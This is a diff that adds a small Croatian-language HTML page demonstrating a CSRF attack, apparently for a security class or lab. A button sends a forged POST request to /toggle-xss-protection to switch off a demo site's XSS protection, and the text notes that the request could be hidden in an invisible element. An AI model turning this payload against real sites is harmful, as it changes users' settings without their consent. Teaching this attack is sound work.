@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Demo</title>
+    <script>
+        function initiateAttack() {
+            fetch('/toggle-xss-protection', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('result').textContent = 
+                    data.error ? `Napad nije uspio zbog: ${data.error}` : 'Uspješno ste promijenili status XSS zaštite. To možete provjeriti osvježavanjem glavne stranice.';
+            })
+            .catch(error => {
+                document.getElementById('result').textContent = `Error: ${error}`;
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Demonstracija CSRF napada</h1>
+    <p>Ovo je nesigurna stranica koju je korisnik mogao dobiti od napadača mailom ili na bilo koji drugi način</p>
+    <p>Ispod se nalazi gumb "Započni napad" kojim se može kontrolirano testirati funkcionalnost, ali se ta funkcionalnost 
+        može jednostavno sakriti unutar nevidljive slike ili drugog html elementa.
+    </p>
+    <p>Cilj napada je promijeniti status XSS zaštite na glavnoj stranici slanjem POST zahtjeva na /toggle-xss-protection</p>
+    <button onclick="initiateAttack()">Započni napad</button>
+    <p id="result"></p>
+</body>
+</html>
